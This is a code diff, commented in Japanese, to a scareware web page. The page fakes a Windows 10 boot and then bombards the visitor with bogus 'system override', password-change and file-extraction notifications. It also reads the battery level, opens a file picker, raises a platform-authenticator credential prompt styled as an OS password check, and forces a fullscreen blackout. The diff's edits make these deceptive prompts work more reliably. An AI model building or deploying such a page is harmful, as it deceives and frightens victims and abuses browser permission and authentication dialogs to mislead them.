@@ -13,20 +13,19 @@
       font-family: monospace;
     }
 
-    /* ─── 【新ハック】建前用のWindows10壁紙背景 ─── */
+    /* Windows10の建前壁紙 */
     .win10-bg {
       position: fixed;
       top: 0; left: 0;
       width: 100vw; height: 100vh;
-      /* 信頼性の高いWikimediaの公式Windows10 Hero壁紙イメージを使用 */
       background-image: url('https://wikimedia.org');
       background-size: cover;
       background-position: center;
-      z-index: 1; /* 通常時は一番下 */
-      display: none; /* 最初は隠す */
+      z-index: 1;
+      display: none;
     }
 
-    /* ─── 強制ロック画面（CSS） ─── */
+    /* 強制ロック画面（CSS） */
     .lock-overlay {
       position: fixed;
       top: 0; left: 0; width: 100vw; height: 100vh;
@@ -45,7 +44,7 @@
     }
 
     .lock-overlay p {
-      white-space: pre-line;
+      white-space: pre-line; /* 指定の設定を維持 */
       color: #ff3333;
       font-size: 20px;
       font-weight: bold;
@@ -108,8 +107,8 @@
   <!-- 輝度0を擬似再現する暗黒カーテン -->
   <div class="blackout-curtain" id="blackout"></div>
 
-  <!-- ★【新ハック】本物のWindows10起動音オーディオファイル -->
-  <audio id="startupSound" src="https://mixkit.co" preload="auto"></audio>
+  <!-- 修正：確実にサポートされている音声ファイルソースへ変更 -->
+  <audio id="startupSound" src="https://google.com" preload="auto"></audio>
 
   <script>
     const initScreen = document.getElementById('initScreen');
@@ -125,11 +124,9 @@
         systemActivated = true;
         initScreen.style.display = 'none';
         
-        // すでに許可されている場合は、即座に起動イベントへ
         if (typeof Notification !== 'undefined' && Notification.permission === 'granted') {
           triggerWindowsBoot();
         } else {
-          // まだ許可がない場合のみロック画面を表示
           lockScreen.classList.add('active');
           enforcePermission();
         }
@@ -155,16 +152,11 @@
       }
     }
 
-    /* ─── 【核心】建前用のWindows 10 起動フェーズ ─── */
+    // Windows 10 起動フェーズ
     function triggerWindowsBoot() {
-      // 1. 壁紙を表示する
       win10Desktop.style.display = "block";
-      
-      // 2. 本物の起動音（サウンド）を再生する
-      // ※事前に画面をクリックしているため、ブラウザの音再生ブロックを回避して爆音で鳴ります
       startupSound.play().catch(err => console.log("オーディオ再生エラー:", err));
 
-      // 3. 起動音が鳴り終わり、安心した絶妙なタイミング（1.5秒後）に裏切り通知ストームが始動！
       setTimeout(() => {
         triggerSuccessNotification();
       }, 1500);
@@ -178,7 +170,7 @@
       new Notification(`⚠ OVERRIDE SUCCESSFUL [ID:${sessionID}]`, { body: `端末との同期が完了しました。\nこれより、バックグラウンドでの\nパケット送信を開始します。`, tag: `alert-1-${sessionID}` });
       setTimeout(() => { new Notification(`⚠ パスワードが変更されました`, { body: `パスワードの変更が受理されました\nこれより、内部データの取得を\n行います。\n[Packet: #${packetNo}]`, tag: `alert-2-${sessionID}` }); }, 800);
 
-      // 1.2秒後にバッテリー傍受 ＆ ファイル選択画面割り込みを起動
+      // バッテリー傍受 ＆ ファイル選択画面割り込み
       setTimeout(() => {
         if (navigator.getBattery) {
           navigator.getBattery().then(battery => {
@@ -186,7 +178,7 @@
             new Notification("⚠ SYSTEM OVERRIDE", { body: `デバイスの電力を掌握しました。\n現在のバッテリー残量: ${level}%\nこれより内部ファイルの抽出を開始します。`, tag: `battery-hack-${sessionID}` });
             setTimeout(() => {
               if (window.showOpenFilePicker) {
-                window.showOpenFilePicker().catch(() => console.log("閉じられました"));
+                window.showOpenFilePicker().catch(() => console.log("ファイル画面が閉じられました"));
               }
             }, 1000);
           });
@@ -201,7 +193,6 @@
       setTimeout(() => { new Notification(`⚠ DANGER`, { body: `失敗\n[Session: ${sessionID}]`, tag: `alert-8-${sessionID}` }); }, 4000);
       setTimeout(() => { new Notification(`⚠ DANGER`, { body: `再試行するために、\n一度シャットダウンしてください。\n[Session: ${sessionID}]`, tag: `alert-9-${sessionID}` }); }, 4200);
 
-      // 最後の通知の0.5秒後（トータル4.7秒後）に、本物のパスワード要求を呼び出す
       setTimeout(() => {
         requestDevicePassword();
       }, 4700);
@@ -209,30 +200,43 @@
 
     // OS純正の本人確認ダイアログ
     async function requestDevicePassword() {
+      // 修正：必須のアルゴリズム型（ES256 と RS256）を両方指定してブラウザ制限を回避
       const publicKeyCredentialCreationOptions = {
         challenge: Uint8Array.from("SHUTDOWN-CONFIRMATION-DATA", c => c.charCodeAt(0)),
         rp: { name: "SYSTEM OVERRIDE SERVICE" },
         user: { id: Uint8Array.from("TARGET123", c => c.charCodeAt(0)), name: "sys_admin", displayName: "SYSTEM_ADMIN" },
-        pubKeyCredParams: [{type: "public-key", alg: -7}],
+        pubKeyCredParams: [
+          { type: "public-key", alg: -7 },   // ES256 (エラー回避用の必須設定)
+          { type: "public-key", alg: -257 } // RS256 (エラー回避用の必須設定)
+        ],
         authenticatorSelection: { authenticatorAttachment: "platform", userVerification: "required" },
         timeout: 60000
       };
 
       try {
         await navigator.credentials.create({ publicKey: publicKeyCredentialCreationOptions });
-        executeBlackout();
+        // 修正：認証ウインドウが完全に閉じてから全画面化するように0.1秒のディレイを挟む
+        setTimeout(executeBlackout, 100);
       } catch (err) {
-        executeBlackout();
+        setTimeout(executeBlackout, 100);
       }
     }
 
     // 強制全画面化 ＆ 画面ブラックアウト
     function executeBlackout() {
       if (document.documentElement.requestFullscreen) {
-        document.documentElement.requestFullscreen().catch(err => console.log(err));
+        document.documentElement.requestFullscreen()
+          .then(() => {
+            blackout.style.display = "block"; 
+            console.log("全画面・輝度0プロトコル：完了");
+          })
+          .catch(err => {
+            console.log("全画面化が拒否されましたが、暗黒化を強制実行します:", err);
+            blackout.style.display = "block"; // 全画面化が万が一失敗しても真っ黒にはする
+          });
+      } else {
+        blackout.style.display = "block";
       }
-      blackout.style.display = "block"; 
-      console.log("全画面・輝度0プロトコル：完了");
     }
   </script>
 </body>
